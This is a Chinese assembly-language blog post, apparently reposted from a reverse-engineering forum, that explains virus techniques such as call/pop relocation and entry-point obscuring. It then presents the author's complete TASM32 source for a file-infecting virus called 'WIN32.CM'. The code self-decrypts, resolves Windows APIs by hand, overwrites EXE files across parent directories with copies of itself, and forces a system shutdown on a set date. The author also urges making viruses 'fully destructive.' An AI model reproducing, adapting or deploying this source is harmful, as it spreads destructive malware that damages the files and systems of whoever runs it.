
# asm 的魅力（五）

> 原文：[`www.pediy.com/kssd/pediy10/102241.html`](https://www.pediy.com/kssd/pediy10/102241.html)

Asm 的魅力（五）

120 个小时就能学会 asm-----------------某小弟

那天个给一个小弟发了一个我用 asm 写的木马。虽然比较简单，但是是按病毒的写法写的！

他就跟我说了上面的那一句话，我回了他一句：纯粹扯淡！！！

Asm 的魅力系统写了 4 篇了，今天做个完结！写个简单的病毒出来！

我问看过我写的这个系列的文章的朋友，我说看了以后又没有喜欢上 asm，他说：的确是！

我很满足，我的目的达到了。

说到病毒，大家其实看到的最多的就是 asm 写的，从 dos 时代到 nt 时代，asm 写的病毒都占 80%的比例！一些优秀的病毒技术都用 asm 得到了完美的表达！比如反汇编引擎，变形引擎，多态引擎，加密引擎等等吧！

我也一直支持玩命大哥做的保护壳专题，尤其支持他用 asm 来表达自己的思想，后来不知道怎么回事又改成 c 写了。

实际上壳技术是病毒技术的衍生，玩命大哥提到的代码乱序引擎等实际上都来自于病毒技术！

当然病毒毕竟是病毒，我还是支持研究纯正的病毒技术，最大的区别：千万要保证十足的破坏性！

最近还在看老 V 的 `kernel` `virus` `class`，就是感染驱动的病毒。很有感触！！asm 来表达病毒，实在是再完美不过了！！

现在开始我们的正文：

病毒基本技术：重定位，OEP 模糊，多态，变形，加密。。。

分别简单的介绍下------------

## （一）重定位

其实大家见的多了，简单的有两个写法

1.

```
Call aa
aa:
Pop ebp
Sub ebp,offset aa
[ebp+offset var]
```

2

```
Call bb
Base=$
Bb:
Pop ebp
[ebp+offset var-base]
```

第二种写法实际上比第一种要省一个字节。这些看自己的实际和爱好了。

## （二）入口点模糊技术

修改 `entry-point`（程序入口）字段使之指向病毒代码

在程序代码中插入一个指向病毒代码的跳转指令

网上有详细的介绍。

## （三）（四）（五）多态变形加密等引擎

网上都有开源的，大家可以研究下！

现在给大家一个我刚写的病毒：

代码:



```
;author:charme
;date:2009.11.30
;index:http://hi.baidu.com/charme000
;about:
;inhect the exe file in the current directory
;peload set 12.30  yeah!!!
;no any poly trick

;just for fun

;complie bat
;set path = E:\\asm\\tool\\tasm32\\tasm32\\tasm32make\\bin
;set include = E:\\asm\\tool\\tasm32\\tasm32\\tasm32make\\include
;set lib = E:\\asm\\tool\\tasm32\\tasm32\\tasm32make\\lib


;tasm32 /ml /m3 trick,,
;tlink32 /Tpe /c /v  trick.obj,,, E:\\asm\\tool\\tasm32\\tasm32\\tasm32make\\lib\\import32.lib

;del \*.bak
;del \*.map
;del \*.xrf
;del \*.obj
;pause


.386
.model flat
locals

vir\_size=offset end\_\_-offset start
\_sub=offset \_cmcc-offset start

.data
db 'charme',0
.code 
start:
call cm
cm:
pop eax
xchg eax,eax
mov ebp,eax
sub ebp,offset cm
cmp ebp,0
je \_cmcc
mov esi,offset \_cmcc
add esi,ebp
xor ecx,ecx
jmp qq1
destr dd 1234
qq1:
xor eax,eax
mov eax,\[ebp+offset destr\]


decrypt:
xor DWORD ptr \[esi\],eax
add esi,4
add ecx,4
cmp ecx,vir\_size-\_sub
db 40 dup (90h)
\_\_cmcc:
jnae decrypt
\_cmcc:
jmp \_start
parac db 200 dup (0)
systime dw 0,0,0,0,0,0,0,0
ori        db 200 dup (0)
cd dd 0
buff     db 200 dup (0)
dotdot      db '..',0
actual          db 200 dup (0)
vic        db '\*.EXE',0
wfd   dd 0,0,0,0,0,0,0,0,0,0,0
searhandle  dd 0
cm1         db 200 dup (0)
cm2          db 200 dup (0)
szTitle db 'WIN32.CM by charme',0
szText db 'charme',0
memhandle dd 0
pii    dd 4 dup (0)
sii     dd 4 dup (0)
\_start:
call \_get\_kernel
assume fs:nothing
mov eax,offset handle\_err
add eax,ebp
push eax
mov eax,fs:\[0\]
push eax
mov fs:\[0\],esp

call \_find\_main\_api
call \_find\_other\_api

\_begin:
mov eax,offset systime
push eax
call \[ebp+offset AGetSystemTimeF\]

mov ax,WORD ptr offset \[systime+2\]
cmp al,12
jne \_no\_out

mov ax,WORD ptr offset \[systime+6\]
cmp al,30
je \_xxoo

\_no\_out:
push offset ori
push 000000c8h
call \[ebp+offset AGetCurrentDirectoryF\]
mov DWORD ptr \[ebp+offset cd\],eax

call \[ebp+offset AGetCommandLineF\]

push eax
push offset buff
call \[ebp+offset AlstrcpyF\]

mov edi,eax
\_cmp:
cmp BYTE ptr \[edi\],'.'
jz \_do
inc edi
jmp \_cmp
\_do:
mov esi,edi
inc esi
add edi,4
mov BYTE ptr \[edi\],00

\_inject:
call \_inj\_dir
push offset dotdot
call \[ebp+offset ASetCurrentDirectoryF\]

push offset actual
push 000000c8h
call \[ebp+offset AGetCurrentDirectoryF\]
cmp eax,DWORD ptr \[buff\]
je \_fill\_clip
mov DWORD ptr \[buff\],eax
jmp \_inject

\_inj\_dir:
push DWORD ptr \[ebp+offset wfd\]
push DWORD ptr \[ebp+offset vic\]
call \[ebp+offset  AFindFirstFileAF\]
mov DWORD ptr \[ebp+offset searhandle\],eax

\_loop:
cmp eax,-1
je \_fill\_clip
or eax,eax
jnz \_next
ret

\_next:
push offset cm1
push offset cm2
call \[ebp+offset AlstrcpyF\]

\_\_loop:
cmp BYTE ptr \[edi\],'.'
jz \_deal
inc edi
jmp \_\_loop

\_deal:
inc edi
mov DWORD ptr \[edi\],0004d4f43h

push offset cm2
push offset cm1
call \[ebp+offset AMoveFileF\]

push 0
push offset cm1
push offset parac+1
call \[ebp+offset ACopyFileF\]

push offset wfd
push DWORD ptr \[searhandle\]
call \[ebp+offset AFindNextFileF\]
jmp \_loop

\_\_fill\_clip:
push 0
call \[ebp+offset AOpenClipboardF\]
call \[ebp+offset AEmptyClipboardF\]

push (offset szText-offset szTitle)
push 2
call \[ebp+offset AGlobalAllocF\]

push eax
push DWORD ptr \[ebp+memhandle\]
call \[ebp+offset AGlobalLockF\]

push eax
push offset szTitle
push eax
call \[ebp+offset AGlobalUnlockF\]

push DWORD ptr \[ebp+offset memhandle\]
push 1
call \[ebp+offset ASetClipboardDataF\]
call \[ebp+offset ACloseClipboardF\]
jmp \_run

\_xxoo:
push 1
push offset szTitle
push offset szText
push 0
call \[ebp+offset AMessageBoxF\]

push 0
push 2
call \[ebp+offset AExitWindowsExF\]

\_fill\_clip:
push offset ori
call \[ebp+offset ASetCurrentDirectoryF\]

mov ax,WORD ptr offset \[systime+4\]
cmp al,2
je \_\_fill\_clip

\_run:
push offset pii
push offset sii
xor eax,eax
push eax
push eax
push 10h
push eax
push eax
push eax
call \[ebp+offset AGetCommandLineF\]
inc eax
push eax

\_done:
mov DWORD ptr \[esi\],0004d4f43h
push offset parac+1
call \[ebp+offset ACreateProcessF\]
push 0
call \[ebp+offset AExitProcessF\]

handle\_err:
pop esp
ret

\_exit:
pop edx
pop eax
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
\_find\_other\_api:
jmp fo\_code

dll\_base dd 0

user32N db "user32.dll",0
user32A dd 0

apis\_name:
 CreateFileF db "CreateFileA",0
CloseHandleF db "CloseHandle",0
WriteFileF db "WriteFile",0
ReadFileF db "ReadFile",0
MoveFileF db "MoveFile",0

GetFileSizeF db "GetFileSize",0
GlobalAllocF db "GlobalAlloc",0
GlobalLockF db "GlobalLock",0
GlobalUnlockF db "GlobalUnlock",0

SetFilePointerF db "SetFilePointer",0
GetSystemTimeF db "GetSystemTime",0
FindFirstFileF db "FindFirstFileA",0
FindNextFileF db "FindNextFileA",0
FindCloseF db "FindClose",0
GetCommandLineF db "GetCommandLine",0

ExitWindowsExF db "ExitWindowsEx",0
ExitProcessF db "ExitProcess",0
CreateProcessF db "CreateProcess",0

LoadLibraryF db "LoadLibraryA",0
FreeLibraryF db "FreeLibrary",0
GetEnvironmentVariableF db "ExpandEnvironmentStringsA",0
GetModuleFileNameF db "GetModuleFileNameA",0
CopyFileF db "CopyFileA",0
GetCurrentDirectoryF db "GetCurrentDirectoryA",0
SetCurrentDirectoryF db "SetCurrentDirectoryA",0
lstrcpyF db "lstrcpy",0

 dd 0ffh





apis\_address:
ACreateFileF dd 0
ACloseHandleF dd 0
AWriteFileF dd 0
AReadFileF dd 0
AMoveFileF dd 0

 AGetFileSizeF dd 0
AGlobalAllocF dd 0
AGlobalLockF dd 0
AGlobalUnlockF dd 0
 ASetFilePointerF dd 0
AGetSystemTimeF dd 0
ASleepF dd 0
 AFindFirstFileAF dd 0
AFindNextFileF dd 0
AFindCloseF dd 0
AGetLastErrorF dd 0

AExitWindowsExF dd 0
AExitProcessF dd 0
ACreateProcessF dd 0
ALoadLibraryF dd 0
AFreeLibraryF dd 0


ACopyFileF dd 0
AGetCurrentDirectoryF dd 0
ASetCurrentDirectoryF dd 0
AGetFileAttributesF dd 0
AGetCommandLineF dd 0
AlstrcpyF dd 0

dd 0ffh


user32\_api:
OpenClipboardF db "OpenClipboard",0
CloseClipboardF db "CloseClipboard",0
EmptyClipboardF db "EmptyClipboard",0

SetClipboardDataF db "SetClipboardData",0
MessageBoxF db "MessageBoxA",0

user32\_addresses:
AOpenClipboardF dd 0
ACloseClipboardF dd 0

ASetClipboardDataF dd 0
AEmptyClipboardF dd 0
AMessageBoxF dd 0
dd 0ffh

fo\_code:

mov esi,offset apis\_name
mov edi,offset apis\_address
add esi,ebp
add edi,ebp
push DWORD ptr \[ebp+offset kernel\_base\]
pop DWORD ptr \[ebp+offset dll\_base\]

call l00p\_apis



mov eax,offset user32N
add eax,ebp
push eax
call \[ebp+offset ALoadLibraryF\]
or eax,eax
jz \_exit
mov \[ebp+offset dll\_base\],eax
mov esi,offset user32\_api
mov edi,offset user32\_addresses
add esi,ebp
add edi,ebp
call l00p\_apis




ret


l00p\_apis:
mov eax,esi
push eax
push DWORD ptr \[ebp+offset dll\_base\]
call dword ptr\[ebp+offset AGetProcAddressF\]
or eax,eax
jz \_exit
mov dword ptr \[edi\],eax

l00p\_small:
inc esi
cmp byte ptr\[esi\],0
jne l00p\_small

next\_api\_name:
inc esi

add edi,4
cmp dword ptr \[edi\],0ffh
je finish\_fo
jmp l00p\_apis
finish\_fo:

ret 

;///////////////////getting kernel base/////////////
\_get\_kernel:
jmp this\_code

kernel\_base dd 0

this\_code:

mov ecx,\[esp+4\]

loop\_find\_kernel:

xor edx,edx
 dec ecx
mov dx,\[ecx+3ch\]
test dx,0f800h
jnz loop\_find\_kernel

cmp ecx,\[ecx+edx+34h\]
jnz loop\_find\_kernel

cmp word ptr \[ecx\],"ZM"
jne loop\_find\_kernel

 mov \[ebp+offset kernel\_base\],ecx
lrrt:
ret


\_find\_main\_api:

jmp finder\_data
pe\_offset dd 0
Export\_address dd 0
Export\_size dd 0
Current\_kern dd 0
function\_no dd 0
function\_addr dd 0
function\_ord dd 0
function\_name dd 0
base\_ord dd 0
GetProcAddressF db "GetProcAddress",0
AGetProcAddressF dd 0
GetModuleHandleN db "GetModuleHandleA",0
GetModuleHandleAd dd 0

finder\_data:
mov edi,\[ebp+offset kernel\_base\]
add edi,\[edi+3ch\]      ;just checking
cmp word ptr \[edi\],"EP"
jne \_exit

mov dword ptr \[ebp+offset pe\_offset\],edi
mov eax,\[edi+78h\]      ;export table rva
push eax
mov eax,\[edi+7ch\]      ;export table size 
mov \[ebp+offset Export\_size\],eax
pop eax
mov \[ebp+offset Export\_address\],eax
add eax,\[ebp+offset kernel\_base\]
mov edx,\[eax+16\]               ;  ordinal base
 add edx,\[ebp+offset kernel\_base\]  
mov \[ebp+offset base\_ord\],edx
mov edx,\[eax+24\]               ;no. of exported functions
mov \[ebp+offset function\_no\],edx 
mov edx,\[eax+28\]              ;rva of exported functions
add edx,\[ebp+offset kernel\_base\]
mov \[ebp+offset function\_addr\],edx 
mov edx,\[eax+32\]              ; rva of exported function name
add edx,\[ebp+offset kernel\_base\]
mov \[ebp+offset function\_name\],edx
mov edx,\[eax+36\]  ;rva for name ordinal
add edx,\[ebp+offset kernel\_base\]
mov \[ebp+offset function\_ord\],edx
xor edx,edx 
xor eax,eax
mov eax,\[ebp+offset function\_name\] ; getting the GetProcAddress api address
mov edx,offset GetProcAddressF
add edx,ebp
 xor ecx,ecx
   mov edi,\[eax\]
 add edi,\[ebp+offset kernel\_base\]

loop\_search\_1:
 mov esi,edx
match\_byte:

cmpsb
jne Next\_one
cmp byte ptr \[edi\],0
je Got\_it
jmp  match\_byte

Next\_one:
add cx,1
add eax,4
  mov edi,\[eax\]
 add edi,\[ebp+offset kernel\_base\]

jmp loop\_search\_1
jmp \_exit
Got\_it:

mov edi,\[eax\]
 add edi,\[ebp+offset kernel\_base\]
 shl ecx,1
mov eax,\[ebp+offset function\_ord\]
add eax,ecx
xor ecx,ecx
mov cx,word ptr \[eax\]
shl ecx,2
mov eax,\[ebp+offset function\_addr\]
add eax,ecx
 mov eax,\[eax\]
add eax,\[ebp+offset kernel\_base\]
 mov \[ebp+offset AGetProcAddressF\],eax

ret

exit\_finder:
mov eax,0

ret
end\_\_:
end start

```



# 还是一贯的掐米风格的 `asm`，呼呼！！
## 说明

我在想一个问题，病毒的技术方面有很多已经很成熟了，那么那些地方还有潜力来研究呢？

我想了很长一段时间，也跟朋友做过一些探讨。

我个人觉得在加密，变形，还有驱动感染方面还有很大的空间！

如果有朋友研究病毒，可以交流下，或许还有其他的方面！

`Asm` 作为一种语言，我认为他是一种优美的语言！正如我几篇文章阐述的！

不过再怎么说，他都只是一个工具，那么这样说的话，我希望我给大家推荐了一个优秀的工具！

`Asm` 是利器啊！此利器非彼利器，乃巨利器！
